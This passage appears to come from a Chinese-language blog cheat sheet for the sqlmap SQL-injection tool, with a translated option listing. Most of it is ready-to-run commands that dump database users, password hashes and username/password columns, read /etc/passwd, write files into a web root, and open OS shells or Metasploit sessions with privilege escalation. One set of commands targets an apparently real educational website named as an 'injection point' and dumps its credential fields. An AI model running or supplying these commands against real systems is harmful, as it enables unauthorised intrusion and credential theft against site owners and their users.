class="line">9)--dumap-all列出所有数据库，所有表内容</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dump-all -v 0</span><br><span class="line"></span><br><span class="line">只列出用户自己新建的数据库和表的内容</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dump-all --exclude-sysdbs -v 0</span><br><span class="line"></span><br><span class="line">10)--file读取文件内容[load_file()函数]</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --file &#x2F;etc&#x2F;password</span><br><span class="line"></span><br><span class="line">11)执行SQL</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --sql-shell</span><br><span class="line"></span><br><span class="line">12)-p 指定参数</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 1 -p &quot;id&quot;</span><br><span class="line"></span><br><span class="line">-p可以指定多参数-p &quot;cat,id&quot;</span><br><span class="line"></span><br><span class="line">13)POST提交</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --method POST --data &quot;id&#x3D;1&quot;</span><br><span class="line"></span><br><span class="line">14)COOKIE提交</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --cookie &quot;id&#x3D;1&quot; -v 1</span><br><span class="line"></span><br><span class="line">cookie值可以由TamperData抓取</span><br><span class="line"></span><br><span class="line">15)refer欺骗</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --refer &quot;url&quot; -v 3</span><br><span class="line"></span><br><span class="line">16)使用自定义user-agent或者user-agents.txt</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --user-agent &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 5.1)&quot; -v 3</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 1 -a &quot;.&#x2F;txt&#x2F;user-agents.txt&quot;</span><br><span class="line"></span><br><span class="line">17)使用多线程猜解</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 1 --current-user --threads 3</span><br><span class="line"></span><br><span class="line">18)指定数据库，绕过SQLMAP的自动检测</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 2 --dbms &quot;PostgreSQL&quot;</span><br><span class="line"></span><br><span class="line">19)指定操作系统绕过SQLMAP自动检测</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 2 --os &quot;Windows&quot;</span><br><span class="line"></span><br><span class="line">20)--prefix and --postfix自定义payload</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; -v 3 -p &quot;id&quot; --prefix &quot;&#39;&quot; --postfix &quot;and &#39;test&#39;&#x3D;&#39;test&quot;</span><br><span class="line"></span><br><span class="line">21)union注入测试</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --union-test -v -1</span><br><span class="line"></span><br><span class="line">22)配合order by</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --union-test --union-tech orderby -v 1</span><br><span class="line"></span><br><span class="line">23)python sqlmap.py -u &quot;url&quot; -v 1 --union-use --banner</span><br><span class="line"></span><br><span class="line">24)python sqlmap.py -u &quot;url&quot; -v 5 --union-use --current-user</span><br><span class="line"></span><br><span class="line">25)python sqlmap.py -u &quot;url&quot; -v 1 --union-use --dbs</span><br></pre></td></tr></table></figure>

<p>常用语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -f -b –current-user –current-db –users –passwords –dbs -v 0</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –passwords -U root –union-use -v 2</span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2</span><br><span class="line"></span><br><span class="line">4.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –dump -C “user,pass” -v 1 –exclude-sysdbs</span><br><span class="line"></span><br><span class="line">5.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –sql-shell -v 2</span><br><span class="line"></span><br><span class="line">6.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –file-read “c:\boot.ini” -v 2</span><br><span class="line"></span><br><span class="line">7.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt -v 2</span><br><span class="line"></span><br><span class="line">8.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-cmd “id” -v 1</span><br><span class="line"></span><br><span class="line">9.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-shell –union-use -v 2</span><br><span class="line"></span><br><span class="line">10.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 –priv-esc -v 1</span><br><span class="line"></span><br><span class="line">11.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 1</span><br><span class="line"></span><br><span class="line">12.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –os-bof –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 1</span><br><span class="line"></span><br><span class="line">13.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –reg-add –reg-key&#x3D;”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value&#x3D;Test –reg-type&#x3D;REG_SZ –reg-data&#x3D;1</span><br><span class="line"></span><br><span class="line">14.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b –eta</span><br><span class="line"></span><br><span class="line">15.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mysql&#x2F;get_str_brackets.php?id&#x3D;1″ -p id –prefix “‘)” –suffix “AND (‘abc’&#x3D;&#39;abc”</span><br><span class="line"></span><br><span class="line">16.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mysql&#x2F;basic&#x2F;get_int.php?id&#x3D;1″ –auth-type Basic –auth-cred “testuser:testpass”</span><br><span class="line"></span><br><span class="line">17.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -l burp.log –scope&#x3D;”(www)?\.target\.(com|net|org)”</span><br><span class="line"></span><br><span class="line">18.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mysql&#x2F;get_int.php?id&#x3D;1″ –tamper tamper&#x2F;between.py,tamper&#x2F;randomcase.py,tamper&#x2F;space2comment.py -v 3</span><br><span class="line"></span><br><span class="line">19.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mssql&#x2F;get_int.php?id&#x3D;1″ –sql-query “SELECT ‘foo’” -v 1</span><br><span class="line"></span><br><span class="line">20.</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.evil0x.com&#x2F; mysql&#x2F;get_int_4.php?id&#x3D;1″ –common-tables -D testdb –banner</span><br></pre></td></tr></table></figure>

<p>简单的注入流程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.读取数据库版本，当前用户，当前数据库</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -f -b –current-user –current-db -v 1</span><br><span class="line"></span><br><span class="line">2.判断当前数据库用户权限</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –privileges -U 用户名 -v 1</span><br><span class="line"></span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –is-dba -U 用户名 -v 1</span><br><span class="line"></span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –users –passwords -v 2</span><br><span class="line"></span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –passwords -U root -v 2</span><br><span class="line"></span><br><span class="line">4.获取所有数据库</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –dbs -v 2</span><br><span class="line"></span><br><span class="line">5.获取指定数据库中的所有表</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –tables -D mysql -v 2</span><br><span class="line"></span><br><span class="line">6.获取指定数据库名中指定表的字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –columns -D mysql -T users -v 2</span><br><span class="line"></span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2</span><br><span class="line"></span><br><span class="line">8.file-read读取web文件</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –file-read “&#x2F;etc&#x2F;passwd” -v 2</span><br><span class="line"></span><br><span class="line">9.file-write写入文件到web</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 –file-write &#x2F;localhost&#x2F;mm.php –file-dest</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;www.nxadmin.com&#x2F;sql-injection.php?id&#x3D;1&quot; –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</span><br><span class="line"></span><br><span class="line">将本地的test.txt写入到站点服务器的html目录下。</span><br></pre></td></tr></table></figure>

<p>python sqlmap/sqlmap.py -help</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options（选项）：</span><br><span class="line"></span><br><span class="line">--version 显示程序的版本号并退出</span><br><span class="line"></span><br><span class="line">-h, --help 显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">-v VERBOSE 详细级别：0-6（默认为1）</span><br><span class="line"></span><br><span class="line">Target（目标）：</span><br><span class="line"></span><br><span class="line">以下至少需要设置其中一个选项，设置目标URL。</span><br><span class="line"></span><br><span class="line">-d DIRECT 直接连接到数据库。</span><br><span class="line"></span><br><span class="line">-u URL, --url&#x3D;URL 目标URL。</span><br><span class="line"></span><br><span class="line">-l LIST 从Burp或WebScarab代理的日志中解析目标。</span><br><span class="line"></span><br><span class="line">-r REQUESTFILE 从一个文件中载入HTTP请求。</span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK 处理Google dork的结果作为目标URL。</span><br><span class="line"></span><br><span class="line">-c CONFIGFILE 从INI配置文件中加载选项。</span><br><span class="line"></span><br><span class="line">Request（请求）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来指定如何连接到目标URL。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--data&#x3D;DATA 通过POST发送的数据字符串</span><br><span class="line"></span><br><span class="line">--cookie&#x3D;COOKIE HTTP Cookie头</span><br><span class="line"></span><br><span class="line">--cookie-urlencode URL 编码生成的cookie注入</span><br><span class="line"></span><br><span class="line">--drop-set-cookie 忽略响应的Set - Cookie头信息</span><br><span class="line"></span><br><span class="line">--user-agent&#x3D;AGENT 指定 HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--random-agent 使用随机选定的HTTP User - Agent头</span><br><span class="line"></span><br><span class="line">--referer&#x3D;REFERER 指定 HTTP Referer头</span><br><span class="line"></span><br><span class="line">--headers&#x3D;HEADERS 换行分开，加入其他的HTTP头</span><br><span class="line"></span><br><span class="line">--auth-type&#x3D;ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</span><br><span class="line"></span><br><span class="line">--auth-cred&#x3D;ACRED HTTP身份验证凭据（用户名:密码）</span><br><span class="line"></span><br><span class="line">--auth-cert&#x3D;ACERT HTTP认证证书（key_file，cert_file）</span><br><span class="line"></span><br><span class="line">--proxy&#x3D;PROXY 使用HTTP代理连接到目标URL</span><br><span class="line"></span><br><span class="line">--proxy-cred&#x3D;PCRED HTTP代理身份验证凭据（用户名：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy 忽略系统默认的HTTP代理</span><br><span class="line"></span><br><span class="line">--delay&#x3D;DELAY 在每个HTTP请求之间的延迟时间，单位为秒</span><br><span class="line"></span><br><span class="line">--timeout&#x3D;TIMEOUT 等待连接超时的时间（默认为30秒）</span><br><span class="line"></span><br><span class="line">--retries&#x3D;RETRIES 连接超时后重新连接的时间（默认3）</span><br><span class="line"></span><br><span class="line">--scope&#x3D;SCOPE 从所提供的代理日志中过滤器目标的正则表达式</span><br><span class="line"></span><br><span class="line">--safe-url&#x3D;SAFURL 在测试过程中经常访问的url地址</span><br><span class="line"></span><br><span class="line">--safe-freq&#x3D;SAFREQ 两次访问之间测试请求，给出安全的URL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Optimization（优化）：</span><br><span class="line"></span><br><span class="line">这些选项可用于优化SqlMap的性能。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-o 开启所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output 预测常见的查询输出</span><br><span class="line"></span><br><span class="line">--keep-alive 使用持久的HTTP（S）连接</span><br><span class="line"></span><br><span class="line">--null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line"></span><br><span class="line">--threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Injection（注入）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER 可测试的参数（S）</span><br><span class="line"></span><br><span class="line">--dbms&#x3D;DBMS 强制后端的DBMS为此值</span><br><span class="line"></span><br><span class="line">--os&#x3D;OS 强制后端的DBMS操作系统为这个值</span><br><span class="line"></span><br><span class="line">--prefix&#x3D;PREFIX 注入payload字符串前缀</span><br><span class="line"></span><br><span class="line">--suffix&#x3D;SUFFIX 注入payload字符串后缀</span><br><span class="line"></span><br><span class="line">--tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Detection（检测）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</span><br><span class="line"></span><br><span class="line">--risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</span><br><span class="line"></span><br><span class="line">--string&#x3D;STRING 查询时有效时在页面匹配字符串</span><br><span class="line"></span><br><span class="line">--regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</span><br><span class="line"></span><br><span class="line">--text-only 仅基于在文本内容比较网页</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Techniques（技巧）：</span><br><span class="line"></span><br><span class="line">这些选项可用于调整具体的SQL注入测试。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--technique&#x3D;TECH SQL注入技术测试（默认BEUST）</span><br><span class="line"></span><br><span class="line">--time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</span><br><span class="line"></span><br><span class="line">--union-char&#x3D;UCHAR 用于暴力猜解列数的字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fingerprint（指纹）：</span><br><span class="line"></span><br><span class="line">-f, --fingerprint 执行检查广泛的DBMS版本指纹</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Enumeration（枚举）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己</span><br><span class="line"></span><br><span class="line">的SQL语句。</span><br><span class="line"></span><br><span class="line">-b, --banner 检索数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user 检索数据库管理系统当前用户</span><br><span class="line"></span><br><span class="line">--current-db 检索数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba 检测DBMS当前用户是否DBA</span><br><span class="line"></span><br><span class="line">--users 枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords 枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges 枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles 枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs 枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables 枚举的DBMS数据库中的表</span><br><span class="line"></span><br><span class="line">--columns 枚举DBMS数据库表列</span><br><span class="line"></span><br><span class="line">--dump 转储数据库管理系统的数据库中的表项</span><br><span class="line"></span><br><span class="line">--dump-all 转储所有的DBMS数据库表中的条目</span><br><span class="line"></span><br><span class="line">--search 搜索列（S），表（S）和&#x2F;或数据库名称（S）</span><br><span class="line"></span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line"></span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line"></span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line"></span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs 枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--start&#x3D;LIMITSTART 第一个查询输出进入检索</span><br><span class="line"></span><br><span class="line">--stop&#x3D;LIMITSTOP 最后查询的输出进入检索</span><br><span class="line"></span><br><span class="line">--first&#x3D;FIRSTCHAR 第一个查询输出字的字符检索</span><br><span class="line"></span><br><span class="line">--last&#x3D;LASTCHAR 最后查询的输出字字符检索</span><br><span class="line"></span><br><span class="line">--sql-query&#x3D;QUERY 要执行的SQL语句</span><br><span class="line"></span><br><span class="line">--sql-shell 提示交互式SQL的shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Brute force（蛮力）：</span><br><span class="line"></span><br><span class="line">这些选项可以被用来运行蛮力检查。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--common-tables 检查存在共同表</span><br><span class="line"></span><br><span class="line">--common-columns 检查存在共同列</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-defined function injection（用户自定义函数注入）：</span><br><span class="line"></span><br><span class="line">这些选项可以用来创建用户自定义函数。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--udf-inject 注入用户自定义函数</span><br><span class="line"></span><br><span class="line">--shared-lib&#x3D;SHLIB 共享库的本地路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">File system access（访问文件系统）：</span><br><span class="line"></span><br><span class="line">这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line"></span><br><span class="line">--file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Operating system access（操作系统访问）：</span><br><span class="line"></span><br><span class="line">这些选项可以用于访问后端数据库管理系统的底层操作系统。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--os-cmd&#x3D;OSCMD 执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell 交互式的操作系统的shell</span><br><span class="line"></span><br><span class="line">--os-pwn 获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">--os-bof 存储过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--priv-esc 数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</span><br><span class="line"></span><br><span class="line">--tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Windows注册表访问：</span><br><span class="line"></span><br><span class="line">这些选项可以被用来访问后端数据库管理系统Windows注册表。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--reg-read 读一个Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-add 写一个Windows注册表项值数据</span><br><span class="line"></span><br><span class="line">--reg-del 删除Windows注册表键值</span><br><span class="line"></span><br><span class="line">--reg-key&#x3D;REGKEY Windows注册表键</span><br><span class="line"></span><br><span class="line">--reg-value&#x3D;REGVAL Windows注册表项值</span><br><span class="line"></span><br><span class="line">--reg-data&#x3D;REGDATA Windows注册表键值数据</span><br><span class="line"></span><br><span class="line">--reg-type&#x3D;REGTYPE Windows注册表项值类型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">General（一般）：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这些选项可以用来设置一些一般的工作参数。</span><br><span class="line"></span><br><span class="line">-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</span><br><span class="line"></span><br><span class="line">-s SESSIONFILE 保存和恢复检索会话文件的所有数据</span><br><span class="line"></span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line"></span><br><span class="line">--eta 显示每个输出的预计到达时间</span><br><span class="line"></span><br><span class="line">--update 更新SqlMap</span><br><span class="line"></span><br><span class="line">--save file保存选项到INI配置文件</span><br><span class="line"></span><br><span class="line">--batch 从不询问用户输入，使用所有默认配置。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Miscellaneous（杂项）：</span><br><span class="line"></span><br><span class="line">--beep 发现SQL注入时提醒</span><br><span class="line"></span><br><span class="line">--check-payload IDS对注入payloads的检测测试</span><br><span class="line"></span><br><span class="line">--cleanup SqlMap具体的UDF和表清理DBMS</span><br><span class="line"></span><br><span class="line">--forms 对目标URL的解析和测试形式</span><br><span class="line"></span><br><span class="line">--gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</span><br><span class="line"></span><br><span class="line">--page-rank Google dork结果显示网页排名（PR）</span><br><span class="line"></span><br><span class="line">--parse-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line"></span><br><span class="line">--replicate 复制转储的数据到一个sqlite3数据库</span><br><span class="line"></span><br><span class="line">--tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</span><br><span class="line"></span><br><span class="line">--wizard 给初级用户的简单向导界面</span><br></pre></td></tr></table></figure>

<p>注入点：<a href="https://links.jianshu.com/go?to=http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">几种注入方式：.&#x2F;sqlmap.py -r search-test.txt -p tfUPass</span><br><span class="line"></span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;testasp.vulnweb.com&#x2F;Login.asp --forms</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;testasp.vulnweb.com&#x2F;Login.asp --data &quot;tfUName&#x3D;1&amp;tfUPass&#x3D;1&quot;</span><br></pre></td></tr></table></figure>

<p>注入点：<a href="https://links.jianshu.com/go?to=http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7">http://jxjy.bfa.edu.cn/bm/newslist.php?cid=7</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取所有数据库名称</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --dbs</span><br><span class="line"></span><br><span class="line">获取当前数据库名称</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --current-db</span><br><span class="line"></span><br><span class="line">获取当前用户名称</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --current-user</span><br><span class="line">获取全部表段</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --tables -D 数据库名称</span><br><span class="line">获取全部字段</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --columns -T 表段 -D 数据库名称</span><br><span class="line">获取字段内容</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --dump -C username,password -T 表段 -D 数据库名称</span><br><span class="line"></span><br><span class="line">1)判断当前用户是否是dba</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --is-dba -v 1</span><br><span class="line"></span><br><span class="line">2)--users:列出数据库管理系统用户</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --users -v 0</span><br><span class="line"></span><br><span class="line">3)--passwords:数据库用户密码(hash)</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --passwords -v 0</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --passwords -U sa -v 0</span><br><span class="line"></span><br><span class="line">4)查看用户权限</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --privileges -v 0</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --privileges -U postgres -v 0</span><br><span class="line"></span><br><span class="line">5)--dbs可以利用的数据库</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --dbs -v 0</span><br><span class="line"></span><br><span class="line">6)--tables列数据库表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --tables -D &quot;information_scheam&quot;</span><br><span class="line"></span><br><span class="line">-D:指定数据名称</span><br><span class="line"></span><br><span class="line">7)--columns 列出表中的列名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --columns -T &quot;user&quot; -D &quot;mysql&quot; -v 1</span><br><span class="line"></span><br><span class="line">-T:指定表名，-D:指定库名</span><br><span class="line"></span><br><span class="line">8)--dump列表中指定列的内容</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --dump -T &quot;users&quot; -D &quot;testdb&quot;</span><br><span class="line"></span><br><span class="line">-C:可以指定字段</span><br><span class="line"></span><br><span class="line">指定列的范围为2到4</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --dump -T &quot;users&quot; -D &quot;testdb&quot; --start 2 --stop 4 -v 0</span><br><span class="line"></span><br><span class="line">9)--dumap-all列出所有数据库，所有表内容</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --dump-all -v 0</span><br></pre></td></tr></table></figure>

<p>sqlmap注入技巧-绕过WAF和IDS</p>
